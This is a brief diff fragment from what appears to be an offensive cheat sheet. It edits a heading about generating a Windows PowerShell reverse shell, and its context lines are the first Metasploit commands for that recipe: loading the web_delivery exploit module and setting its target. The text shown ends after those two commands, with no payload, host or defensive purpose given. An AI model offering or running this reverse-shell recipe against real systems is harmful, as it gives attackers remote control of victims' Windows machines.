@@ -17,7 +17,7 @@ run
 
 *****************************************************************************************************************************
 
-Generate Windows reverse shell 
+Generate Windows reverse shell (it will Powershell reverse shell command)
 
 use exploit/multi/script/web_delivery
 set target 2
